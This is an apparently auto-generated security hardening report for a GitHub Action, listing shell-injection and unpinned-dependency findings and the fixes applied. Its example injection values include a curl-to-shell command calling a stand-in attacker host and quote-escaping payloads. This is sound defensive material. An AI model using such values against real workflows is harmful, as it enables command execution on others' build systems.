<!-- markdownlint-disable -->

# Hardening Report: TheStack-ai--pulser/v1.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **TheStack-ai--pulser/v1.0.0** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Multiple `${{ inputs.* }}` expressions are interpolated directly inside `run:` shell command strings (sub-rule a). This allows an attacker who controls the calling workflow's inputs to inject arbitrary shell commands.

- Line 43: `run: npm install -g pulser-cli@${{ inputs.version }}` — `inputs.version` injected directly into a shell command; a value like `; curl http://evil.com | sh` would execute.
- Line 48: `REPORT=$(pulser "${{ inputs.path }}" --format json ...)` — `inputs.path` injected directly; a value like `"; malicious_cmd; echo "` would break out of the quoted argument.
- Line 66: `pulser "${{ inputs.path }}" --format text ...` — same issue as line 48.
- Line 69: `if [ "${{ inputs.strict }}" = "true" ]` — `inputs.strict` injected directly; a value like `" = "" ] || true; malicious_cmd; [ "x` could alter control flow.

Fix: move each input into an `env:` variable and reference it as a quoted shell variable (e.g., `"$INPUT_VERSION"`, `"$INPUT_PATH"`, `"$INPUT_STRICT"`) inside the `run:` block.

Locations:

- `action.yml:43`
- `action.yml:48`
- `action.yml:66`
- `action.yml:69`

### unpinned-uses (severity: high)

The composite action step `uses: actions/setup-node@v4` references a mutable tag (`v4`) rather than a pinned 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling a supply-chain attack. Fix by pinning to a full SHA, e.g. `uses: actions/setup-node@1d0ff469b13b2fd2b4e6b25e6af3e2f6b6b8c5a4 # v4`.

Locations:

- `action.yml:38`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install pulser-cli"; move to env: map

Locations:

- `action.yml:48`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:54`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:76`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.strict }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:79`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed all findings in action.yml: (1) Pinned actions/setup-node@v4 to full commit SHA 49933ea5288caeca8642d1e84afbd3f7d6820020 with # v4 comment. (2) Moved all ${{ inputs.* }} expressions out of run: shell strings into env: blocks — inputs.version → INPUT_VERSION in the 'Install pulser-cli' step, inputs.path → INPUT_PATH and inputs.strict → INPUT_STRICT in the 'Run pulser' step. All shell references updated to use the corresponding environment variable names ($INPUT_VERSION, $INPUT_PATH, $INPUT_STRICT).

